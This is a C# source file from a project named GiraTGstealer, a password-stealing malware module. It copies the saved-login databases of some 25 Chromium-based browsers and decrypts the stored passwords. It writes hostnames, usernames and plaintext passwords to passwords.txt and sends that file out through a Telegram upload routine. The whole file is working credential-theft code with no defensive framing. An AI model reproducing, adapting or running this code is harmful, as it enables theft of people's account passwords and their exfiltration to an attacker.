using Microsoft.SqlServer.Server;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using GiraTGstealer.stealer;

namespace GiraTGstealer
{
    internal class Passwords
    {
        public static void start()
        {
            AutoStealer.loadDlls();
            
            string ad  = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
            string lad = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
            string ud = "\\User Data\\Default\\Login Data";

            string[] chromBrowsers = new string[]
            {
                lad + "Google\\Chrome" + ud,
                lad + "Google(x86)\\Chrome" + ud,
                lad + "Chromium" + ud,
                ad + "Opera Software\\Opera Stable\\Login Data",
                ad + "Opera Software\\Opera GX Stable\\Login Data",
                lad + "BraveSoftware\\Brave-Browser" + ud,
                lad + "Epic Privacy Browser" + ud,
                lad + "Amigo" + ud,
                lad + "Vivaldi" + ud,
                lad + "Orbitum" + ud,
                lad + "Mail.ru\\Atom" + ud,
                lad + "Kometa" + ud,
                lad + "Comodo\\Dragon" + ud,
                lad + "Torch" + ud,
                lad + "Comodo" + ud,
                lad + "Slimjet" + ud,
                lad + "360Browser\\Browser" + ud,
                lad + "Maxthon3" + ud,
                lad + "K-Melon" + ud,
                lad + "Sputnik\\Sputnik" + ud,
                lad + "Nichrome" + ud,
                lad + "CocCoc\\Browser" + ud,
                lad + "uCozMedia\\Uran" + ud,
                lad + "Chromodo" + ud,
                lad + "Yandex\\YandexBrowser" + ud
            };

            string tDL = "";
            string filename = "passwords.txt";
            string output = "[PASSWORDS]\n\n";

            foreach (string browser in chromBrowsers)
            {
                if(File.Exists(browser))
                {
                    tDL = Environment.GetEnvironmentVariable("temp") + "\\browserPasswords";
                    if(File.Exists(tDL))
                    {
                        File.Delete(tDL);
                    }
                    File.Copy(browser, tDL);
                }
                else
                {
                    continue;
                }

                SQLite SQLite = new SQLite(tDL);
                SQLite.ReadTable("logins");
                

                for(int i = 0; i < SQLite.GetRowCount(); i++) 
                {
                    string hostname = SQLite.GetValue(i, 0);
                    string username = SQLite.GetValue(i, 3);
                    string password = SQLite.GetValue(i, 5);

                    if (string.IsNullOrEmpty(password))
                    {
                        break;
                    }

                    output += "HOSTNAME: " + hostname + "\n"
                        + "USERNAME: " + Crypt.toUTF8(username) + "\n"
                        + "PASSWORD: " + Crypt.toUTF8(Crypt.decryptChrome(password, browser)) + "\n"
                        + "\n";

                    continue;
                }
                continue;
            }

            File.WriteAllText(filename, output);
            telegram.UploadFile(filename, true);
        }
    }
}
